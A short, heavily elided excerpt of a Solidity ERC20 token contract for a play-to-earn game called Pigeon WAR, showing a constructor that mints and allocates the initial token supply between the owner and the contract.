...
// Pigeon WAR: Play-to-Earn, free to play
// https://pigeonwar.com
...
contract TokenERC20 is ERC20Interface, Owned{
  ...
  constructor() public {
    ...
    balances[address(this)] = 900000000000*10**uint(decimals);
    emit Transfer(address(0), owner, 100000000000*10**uint(decimals));
    emit Transfer(address(0), address(this), 900000000000*10**uint(decimals));
  }
...
contract PigeonWar is TokenERC20 {
